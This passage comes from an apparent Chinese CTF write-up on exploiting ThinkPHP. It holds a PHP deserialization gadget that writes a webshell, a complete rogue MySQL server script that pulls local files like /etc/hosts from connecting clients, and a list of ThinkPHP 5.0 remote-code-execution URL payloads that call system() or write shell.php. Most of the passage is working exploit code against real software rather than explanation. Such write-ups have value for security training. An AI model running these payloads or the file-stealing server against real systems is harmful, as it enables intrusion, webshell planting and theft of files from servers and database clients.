<span class="string">&#x27;ctfshow&#x27;</span>,          <span class="comment">// 数据库名</span></span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>          =&gt;  <span class="string">&#x27;root&#x27;</span>,      <span class="comment">// 用户名</span></span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>          =&gt;  <span class="string">&#x27;root&#x27;</span>,          <span class="comment">// 密码</span></span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span>          =&gt;  <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">        );              </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们运行一下这个脚本就可以生成一串base64编码, 然后我们改一下cookie发送即可<img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302202007703.png"
                      alt="image-20230220200722627"
                ></p>
<p>然后就可以写入一个1.php的一句话木马</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302202018148.png"
                      alt="image-20230220201857103"
                ></p>
<p>如果这个方法不行, 可以使用远程读文件的姿势</p>
<h4 id="伪造MySQL服务端读取文件"><a href="#伪造MySQL服务端读取文件" class="headerlink" title="伪造MySQL服务端读取文件"></a>伪造MySQL服务端读取文件</h4><p>伪造一个MySQL的服务端, 让别人连接的情况下, 可以让别人把本地文件远程发给服务端, 这里虽然是读的服务器文件, 但是其实就相当于我们读的自己客户端的文件, 就相当于一个变相的钓鱼</p>
<p>这里我们还是继续用上边的php脚本+python脚本, 但是上边php脚本的服务器地址需要改成我们自己的<code>云服务器地址</code>, 端口也需要改成<code>3389</code></p>
<p>然后我们在云服务器上开始运行这个python脚本, 开始监听</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> AF_INET, SOCK_STREAM, error</span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> dispatcher, loop <span class="keyword">as</span> _asyLoop</span><br><span class="line"><span class="keyword">from</span> asynchat <span class="keyword">import</span> async_chat</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> Struct</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> version_info</span><br><span class="line"><span class="keyword">from</span> logging <span class="keyword">import</span> getLogger, INFO, StreamHandler, Formatter</span><br><span class="line"></span><br><span class="line">_rouge_mysql_sever_read_file_result = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">_rouge_mysql_server_read_file_end = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkVersionPy3</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> version_info &lt; (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rouge_mysql_sever_read_file</span>(<span class="params">fileName, port, showInfo</span>):</span><br><span class="line">    <span class="keyword">if</span> showInfo:</span><br><span class="line">        log = getLogger(__name__)</span><br><span class="line">        log.setLevel(INFO)</span><br><span class="line">        tmp_format = StreamHandler()</span><br><span class="line">        tmp_format.setFormatter(Formatter(<span class="string">&quot;%(asctime)s : %(levelname)s : %(message)s&quot;</span>))</span><br><span class="line">        log.addHandler(</span><br><span class="line">            tmp_format</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_infoShow</span>(<span class="params">*args</span>):</span><br><span class="line">        <span class="keyword">if</span> showInfo:</span><br><span class="line">            log.info(*args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ================================================</span></span><br><span class="line">    <span class="comment"># =======No need to change after this lines=======</span></span><br><span class="line">    <span class="comment"># ================================================</span></span><br><span class="line"></span><br><span class="line">    __author__ = <span class="string">&#x27;Gifts&#x27;</span></span><br><span class="line">    __modify__ = <span class="string">&#x27;Morouu&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> _rouge_mysql_sever_read_file_result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_LastPacket</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_OutOfOrder</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_MysqlPacket</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        packet_header = Struct(<span class="string">&#x27;&lt;Hbb&#x27;</span>)</span><br><span class="line">        packet_header_long = Struct(<span class="string">&#x27;&lt;Hbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, packet_type, payload</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(packet_type, _MysqlPacket):</span><br><span class="line">                self.packet_num = packet_type.packet_num + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.packet_num = packet_type</span><br><span class="line">            self.payload = payload</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">            payload_len = <span class="built_in">len</span>(self.payload)</span><br><span class="line">            <span class="keyword">if</span> payload_len &lt; <span class="number">65536</span>:</span><br><span class="line">                header = _MysqlPacket.packet_header.pack(payload_len, <span class="number">0</span>, self.packet_num)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                header = _MysqlPacket.packet_header.pack(payload_len &amp; <span class="number">0xFFFF</span>, payload_len &gt;&gt; <span class="number">16</span>, <span class="number">0</span>, self.packet_num)</span><br><span class="line"></span><br><span class="line">            result = <span class="string">&quot;&quot;</span>.join(</span><br><span class="line">                (</span><br><span class="line">                    header.decode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> header,</span><br><span class="line">                    self.payload</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">repr</span>(<span class="built_in">str</span>(self))</span><br><span class="line"></span><br><span class="line"><span class="meta">        @staticmethod</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">raw_data</span>):</span><br><span class="line">            packet_num = raw_data[<span class="number">0</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="built_in">ord</span>(raw_data[<span class="number">0</span>])</span><br><span class="line">            payload = raw_data[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> _MysqlPacket(packet_num, payload.decode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_HttpRequestHandler</span>(<span class="title class_ inherited__">async_chat</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr</span>):</span><br><span class="line">            async_chat.__init__(self, sock=addr[<span class="number">0</span>])</span><br><span class="line">            self.addr = addr[<span class="number">1</span>]</span><br><span class="line">            self.ibuffer = []</span><br><span class="line">            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">            self.stateList = [<span class="string">b&quot;LEN&quot;</span>, <span class="string">b&quot;Auth&quot;</span>, <span class="string">b&quot;Data&quot;</span>, <span class="string">b&quot;MoreLength&quot;</span>, <span class="string">b&quot;File&quot;</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> [<span class="string">&quot;LEN&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;Auth&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;Data&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;MoreLength&quot;</span>,</span><br><span class="line">                                                                                                           <span class="string">&quot;File&quot;</span>]</span><br><span class="line">            self.state = self.stateList[<span class="number">0</span>]</span><br><span class="line">            self.sub_state = self.stateList[<span class="number">1</span>]</span><br><span class="line">            self.logined = <span class="literal">False</span></span><br><span class="line">            self.file = <span class="string">&quot;&quot;</span></span><br><span class="line">            self.push(</span><br><span class="line">                _MysqlPacket(</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    <span class="string">&quot;&quot;</span>.join((</span><br><span class="line">                        <span class="string">&#x27;\x0a&#x27;</span>,  <span class="comment"># Protocol</span></span><br><span class="line">                        <span class="string">&#x27;5.6.28-0ubuntu0.14.04.1&#x27;</span> + <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&#x27;</span>,</span><br><span class="line">                    )))</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self.order = <span class="number">1</span></span><br><span class="line">            self.states = [<span class="string">b&#x27;LOGIN&#x27;</span>, <span class="string">b&#x27;CAPS&#x27;</span>, <span class="string">b&#x27;ANY&#x27;</span>] <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> [<span class="string">&#x27;LOGIN&#x27;</span>, <span class="string">&#x27;CAPS&#x27;</span>, <span class="string">&#x27;ANY&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, data</span>):</span><br><span class="line">            _infoShow(<span class="string">&#x27;Pushed: %r&#x27;</span>, data)</span><br><span class="line">            data = <span class="built_in">str</span>(data)</span><br><span class="line">            async_chat.push(self, data.encode(<span class="string">&quot;latin1&quot;</span>) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">collect_incoming_data</span>(<span class="params">self, data</span>):</span><br><span class="line">            _infoShow(<span class="string">&#x27;Data recved: %r&#x27;</span>, data)</span><br><span class="line">            self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">found_terminator</span>(<span class="params">self</span>):</span><br><span class="line">            data = <span class="string">b&quot;&quot;</span>.join(self.ibuffer) <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="string">&quot;&quot;</span>.join(self.ibuffer)</span><br><span class="line">            self.ibuffer = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.state == self.stateList[<span class="number">0</span>]:  <span class="comment"># LEN</span></span><br><span class="line">                len_bytes = data[<span class="number">0</span>] + <span class="number">256</span> * data[<span class="number">1</span>] + <span class="number">65536</span> * data[<span class="number">2</span>] + <span class="number">1</span> <span class="keyword">if</span> checkVersionPy3() <span class="keyword">else</span> <span class="built_in">ord</span>(</span><br><span class="line">                    data[<span class="number">0</span>]) + <span class="number">256</span> * <span class="built_in">ord</span>(data[<span class="number">1</span>]) + <span class="number">65536</span> * <span class="built_in">ord</span>(data[<span class="number">2</span>]) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> len_bytes &lt; <span class="number">65536</span>:</span><br><span class="line">                    self.set_terminator(len_bytes)</span><br><span class="line">                    self.state = self.stateList[<span class="number">2</span>]  <span class="comment"># Data</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.state = self.stateList[<span class="number">3</span>]  <span class="comment"># MoreLength</span></span><br><span class="line">            <span class="keyword">elif</span> self.state == self.stateList[<span class="number">3</span>]:  <span class="comment"># MoreLength</span></span><br><span class="line">                <span class="keyword">if</span> (checkVersionPy3() <span class="keyword">and</span> data[<span class="number">0</span>] != <span class="string">b&#x27;\0&#x27;</span>) <span class="keyword">or</span> data[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">                    self.push(<span class="literal">None</span>)</span><br><span class="line">                    self.close_when_done()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.state = self.stateList[<span class="number">2</span>]  <span class="comment"># Data</span></span><br><span class="line">            <span class="keyword">elif</span> self.state == self.stateList[<span class="number">2</span>]:  <span class="comment"># Data</span></span><br><span class="line">                packet = _MysqlPacket.parse(data)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.order != packet.packet_num:</span><br><span class="line">                        <span class="keyword">raise</span> _OutOfOrder()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># Fix ?</span></span><br><span class="line">                        self.order = packet.packet_num + <span class="number">2</span></span><br><span class="line">                    <span class="keyword">if</span> packet.packet_num == <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">if</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x03&#x27;</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                            self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                            self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                            self.sub_state = self.stateList[<span class="number">4</span>]  <span class="comment"># File</span></span><br><span class="line">                            self.file = fileName.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># end</span></span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(fileName) == <span class="number">1</span>:</span><br><span class="line">                                <span class="keyword">global</span> _rouge_mysql_server_read_file_end</span><br><span class="line">                                _rouge_mysql_server_read_file_end = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet,</span><br><span class="line">                                <span class="string">&#x27;\xFB&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(self.file)</span><br><span class="line">                            ))</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] == <span class="string">&#x27;\x1b&#x27;</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;SelectDB&#x27;</span>)</span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet,</span><br><span class="line">                                <span class="string">&#x27;\xfe\x00\x00\x02\x00&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;\x02&#x27;</span>:</span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">elif</span> packet.payload == <span class="string">&#x27;\x00\x01&#x27;</span>:</span><br><span class="line">                            self.push(<span class="literal">None</span>)</span><br><span class="line">                            self.close_when_done()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span> ValueError()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> self.sub_state == self.stateList[<span class="number">4</span>]:  <span class="comment"># File</span></span><br><span class="line">                            _infoShow(<span class="string">&#x27;-- result&#x27;</span>)</span><br><span class="line">                            <span class="comment"># fileContent</span></span><br><span class="line">                            _infoShow(<span class="string">&#x27;Result: %r&#x27;</span>, data)</span><br><span class="line">                            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">1</span>:</span><br><span class="line">                                self.push(</span><br><span class="line">                                    _MysqlPacket(packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span>)</span><br><span class="line">                                )</span><br><span class="line">                                <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                                self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                                self.order = packet.packet_num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">global</span> _rouge_mysql_sever_read_file_result</span><br><span class="line">                            _rouge_mysql_sever_read_file_result.update(</span><br><span class="line">                                &#123;self.file: data.encode() <span class="keyword">if</span> <span class="keyword">not</span> checkVersionPy3() <span class="keyword">else</span> data&#125;</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># test</span></span><br><span class="line">                            <span class="comment"># print(self.file + &quot;:\n&quot; + content.decode() if checkVersionPy3() else content)</span></span><br><span class="line"></span><br><span class="line">                            self.close_when_done()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">elif</span> self.sub_state == self.stateList[<span class="number">1</span>]:  <span class="comment"># Auth</span></span><br><span class="line">                            self.push(_MysqlPacket(</span><br><span class="line">                                packet, <span class="string">&#x27;\0\0\0\x02\0\0\0&#x27;</span></span><br><span class="line">                            ))</span><br><span class="line">                            <span class="keyword">raise</span> _LastPacket()</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            _infoShow(<span class="string">&#x27;-- else&#x27;</span>)</span><br><span class="line">                            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Unknown packet&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> _LastPacket:</span><br><span class="line">                    _infoShow(<span class="string">&#x27;Last packet&#x27;</span>)</span><br><span class="line">                    self.state = self.stateList[<span class="number">0</span>]  <span class="comment"># LEN</span></span><br><span class="line">                    self.sub_state = <span class="literal">None</span></span><br><span class="line">                    self.order = <span class="number">0</span></span><br><span class="line">                    self.set_terminator(<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">except</span> _OutOfOrder:</span><br><span class="line">                    _infoShow(<span class="string">&#x27;Out of order&#x27;</span>)</span><br><span class="line">                    self.push(<span class="literal">None</span>)</span><br><span class="line">                    self.close_when_done()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                _infoShow(<span class="string">&#x27;Unknown state&#x27;</span>)</span><br><span class="line">                self.push(<span class="string">&#x27;None&#x27;</span>)</span><br><span class="line">                self.close_when_done()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_MysqlListener</span>(<span class="title class_ inherited__">dispatcher</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sock=<span class="literal">None</span></span>):</span><br><span class="line">            dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">                self.create_socket(AF_INET, SOCK_STREAM)</span><br><span class="line">                self.set_reuse_addr()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line">                <span class="keyword">except</span> error:</span><br><span class="line">                    exit()</span><br><span class="line"></span><br><span class="line">                self.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">handle_accept</span>(<span class="params">self</span>):</span><br><span class="line">            pair = self.accept()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pair <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                _infoShow(<span class="string">&#x27;Conn from: %r&#x27;</span>, pair[<span class="number">1</span>])</span><br><span class="line">                _HttpRequestHandler(pair)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> _rouge_mysql_server_read_file_end:</span><br><span class="line">                    self.close()</span><br><span class="line"></span><br><span class="line">    _MysqlListener()</span><br><span class="line">    _asyLoop()</span><br><span class="line">    <span class="keyword">return</span> _rouge_mysql_sever_read_file_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name, content <span class="keyword">in</span> rouge_mysql_sever_read_file(fileName=[<span class="string">&quot;/flag_is_here&quot;</span>, <span class="string">&quot;/etc/hosts&quot;</span>], port=<span class="number">3389</span>,showInfo=<span class="literal">True</span>).items():</span><br><span class="line">        <span class="built_in">print</span>(name + <span class="string">&quot;:\n&quot;</span> + content.decode())</span><br></pre></td></tr></table></figure>

<h3 id="tp5-0版本"><a href="#tp5-0版本" class="headerlink" title="tp5.0版本"></a>tp5.0版本</h3><h4 id="未开启强制路由导致的rce"><a href="#未开启强制路由导致的rce" class="headerlink" title="未开启强制路由导致的rce"></a>未开启强制路由导致的rce</h4><p>最高版本支持到5.0.23</p>
<p>常见payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\Request/input&amp;filter=system&amp;data=dir</span><br><span class="line">?s=index/think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/think\view\driver\Php/display&amp;content=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">?s=index/think\template\driver\file/write&amp;cacheFile=shell.php&amp;content<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">?s=index/think\Container/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func</span>&amp;<span class="title">vars</span>[]=<span class="title">system</span>&amp;<span class="title">vars</span>[]=<span class="title">dir</span></span></span><br><span class="line"><span class="function">?<span class="title">s</span>=<span class="title">index</span>/<span class="title">think</span>\<span class="title">Container</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span></span></span><br><span class="line"><span class="function">?<span class="title">s</span>=<span class="title">index</span>/<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302202111080.png"
                      alt="image-20230220211102933"
                ></p>
<h4 id="变量覆盖导致的rce"><a href="#变量覆盖导致的rce" class="headerlink" title="变量覆盖导致的rce"></a>变量覆盖导致的rce</h4><p>参考例子:</p>
